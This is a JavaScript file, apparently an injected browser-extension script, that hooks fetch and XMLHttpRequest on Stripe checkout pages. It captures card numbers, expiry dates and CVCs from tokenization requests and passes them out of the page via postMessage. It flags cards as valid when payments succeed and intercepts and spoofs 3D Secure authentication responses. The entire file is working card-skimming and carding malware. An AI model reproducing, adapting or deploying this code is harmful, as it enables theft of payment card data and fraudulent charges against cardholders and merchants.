(function() {
    var v_s = window;
    if (v_s._samuraiInjected) {
        return;
    }
    v_s._samuraiInjected = true;
    var v_r = new Map();
    var v_bh = 0;
    var v_e = null;

    function v_ap() {
        try {
            if (v_s.location.hostname !== "js.stripe.com") {
                return v_s.location.hostname;
            }
            if (document.referrer) {
                return new URL(document.referrer).hostname;
            }
            if (v_s.parent !== v_s) {
                try {
                    return v_s.parent.location.hostname;
                } catch (v_w) {}
            }
            return v_s.location.hostname;
        } catch (v_g) {
            return v_s.location.hostname;
        }
    }

    function v_u() {
        return true;
    }
    v_s.addEventListener("message", function(v_ai) {
        if (v_ai.source !== v_s) {
            return;
        }
        if (v_ai.data?.type !== "EAGLE_LAND") {
            return;
        }
        var v_b = v_r.get(v_ai.data.requestId);
        if (v_b) {
            if (v_ai.data.error) {
                v_b.reject(new Error(v_ai.data.error));
            } else {
                v_b.resolve(v_ai.data.response);
            }
            v_r.delete(v_ai.data.requestId);
        }
    });

    function v_au(v_am, v_bo) {
        return new Promise(function(v_ae, v_o) {
            var v_p = ++v_bh;
            v_r.set(v_p, {
                resolve: v_ae,
                reject: v_o
            });
            setTimeout(function() {
                if (v_r.has(v_p)) {
                    v_r.delete(v_p);
                    v_o(new Error("t"));
                }
            }, 30000);
            var v_az = {};
            if (v_bo.headers) {
                if (v_bo.headers instanceof Headers) {
                    v_bo.headers.forEach(function(v_c, v_bj) {
                        v_az[v_bj] = v_c;
                    });
                } else if (typeof v_bo.headers === "object") {
                    Object.assign(v_az, v_bo.headers);
                }
            }
            v_s.postMessage({
                type: "EAGLE_FLY",
                requestId: v_p,
                url: v_am,
                method: v_bo.method || "POST",
                headers: v_az,
                body: v_bo.body,
                site: v_ap()
            }, "*");
        });
    }

    function v_ah(v_at) {
        try {
            var v_h = new URLSearchParams(v_at);
            var v_l = v_h.get("card[number]")?.replace(/\s|\+/g, "");
            var v_ad = v_h.get("card[exp_month]");
            var v_as = v_h.get("card[exp_year]");
            var v_v = v_h.get("card[cvc]");
            if (v_l && v_ad && v_as && v_v) {
                var v_aw = v_as.length === 4 ? v_as.slice(-2) : v_as;
                var v_ax = v_l + "|" + v_ad + "|" + v_aw + "|" + v_v + "|" + v_ap();
                v_e = v_ax;
                v_s.postMessage({
                    type: "X9K2M",
                    card: v_ax
                }, "*");
            }
        } catch (v_m) {}
    }

    function v_bk() {
        if (v_e) {
            v_s.postMessage({
                type: "Q7P3V",
                card: v_e
            }, "*");
            v_e = null;
        }
    }

    function v_an(v_ar, v_bi, v_ab) {
        if (v_bi < 200 || v_bi >= 300) {
            return false;
        }
        try {
            var v_be = JSON.parse(v_ab);
            if (v_be.error || v_be.failure_code || v_be.decline_code) {
                return false;
            }
            if (v_be.status === "succeeded" || v_be.status === "active" || v_be.status === "requires_capture" || v_be.paid === true) {
                return true;
            }
            if (v_be.payment_intent?.status === "succeeded" || v_be.payment_intent?.status === "requires_capture") {
                return true;
            }
            if (v_be.latest_invoice?.paid === true) {
                return true;
            }
            if (v_be.subscription?.status === "active") {
                return true;
            }
            return false;
        } catch (v_bg) {
            return false;
        }
    }

    function v_ak(v_a) {
        return v_a && v_a.includes("/v1/3ds2/authenticate");
    }

    function v_bn(v_z) {
        return v_z && v_z.includes("api.stripe.com") && ["/v1/payment_methods", "/v1/tokens", "/v1/sources"].some(function(v_n) {
            return v_z.includes(v_n);
        });
    }

    function v_aa(v_bl) {
        if (!v_bl) {
            return false;
        }
        return v_bl.includes("/confirm") || v_bl.includes("/v1/charges") || v_bl.includes("/v1/subscriptions") || v_bl.includes("/v1/payment_intents") || v_bl.includes("/v1/setup_intents") || v_bl.includes("/payment_pages") || v_bl.includes("/v1/invoices");
    }
    var v_x = v_s.fetch;
    v_s.fetch = async function(v_ao, v_bb = {}) {
        var v_k = typeof v_ao === "string" ? v_ao : v_ao instanceof Request ? v_ao.url : String(v_ao);
        if (v_bn(v_k)) {
            var v_aq = v_bb.body;
            if (v_ao instanceof Request && !v_aq) {
                v_aq = await v_ao.clone().text();
            }
            v_ah(v_aq);
        }
        if (v_ak(v_k) && v_u()) {
            try {
                var v_aq = v_bb.body;
                if (v_ao instanceof Request && !v_aq) {
                    v_aq = await v_ao.clone().text();
                }
                var v_bc = await v_au(v_k, {
                    method: v_bb.method || "POST",
                    headers: v_bb.headers,
                    body: v_aq
                });
                if (v_bc.error) {
                    throw new Error(v_bc.error);
                }
                return new Response(v_bc.body, {
                    status: v_bc.status,
                    statusText: v_bc.statusText || "OK",
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
            } catch (v_bm) {
                return v_x.call(this, v_ao, v_bb);
            }
        }
        var v_f = await v_x.call(this, v_ao, v_bb);
        if (v_aa(v_k) && v_e) {
            try {
                var v_bf = v_f.clone();
                var v_j = await v_bf.text();
                if (v_an(v_k, v_f.status, v_j)) {
                    v_bk();
                }
            } catch (v_aj) {}
        }
        return v_f;
    };
    var v_ba = XMLHttpRequest.prototype;
    var v_bd = v_ba.open;
    var v_af = v_ba.send;
    var v_ag = v_ba.setRequestHeader;
    v_ba.open = function(v_t, v_ac, ...v_al) {
        this._interceptedUrl = v_ac;
        this._interceptedMethod = v_t;
        this._interceptedHeaders = {};
        return v_bd.call(this, v_t, v_ac, ...v_al);
    };
    v_ba.setRequestHeader = function(v_av, v_i) {
        if (this._interceptedHeaders) {
            this._interceptedHeaders[v_av] = v_i;
        }
        return v_ag.call(this, v_av, v_i);
    };
    v_ba.send = function(v_q) {
        var v_ay = this;
        if (v_bn(this._interceptedUrl)) {
            v_ah(v_q);
        }
        if (v_ak(this._interceptedUrl) && v_u()) {
            v_au(this._interceptedUrl, {
                method: this._interceptedMethod || "POST",
                headers: this._interceptedHeaders,
                body: v_q
            }).then(function(v_y) {
                Object.defineProperties(v_ay, {
                    readyState: {
                        value: 4
                    },
                    status: {
                        value: v_y.status
                    },
                    statusText: {
                        value: v_y.statusText || "OK"
                    },
                    responseText: {
                        value: v_y.body
                    },
                    response: {
                        value: v_y.body
                    }
                });
                if (v_ay.onreadystatechange) {
                    v_ay.onreadystatechange();
                }
                v_ay.dispatchEvent(new Event("readystatechange"));
                if (v_ay.onload) {
                    v_ay.onload();
                }
                v_ay.dispatchEvent(new Event("load"));
                v_ay.dispatchEvent(new Event("loadend"));
            }).catch(function() {
                v_af.call(v_ay, v_q);
            });
            return;
        }
        if (v_aa(this._interceptedUrl)) {
            var v_d = v_ay.onload;
            v_ay.onload = function() {
                if (v_e && v_an(v_ay._interceptedUrl, v_ay.status, v_ay.responseText)) {
                    v_bk();
                }
                if (v_d) {
                    v_d.call(this);
                }
            };
        }
        return v_af.call(this, v_q);
    };
})();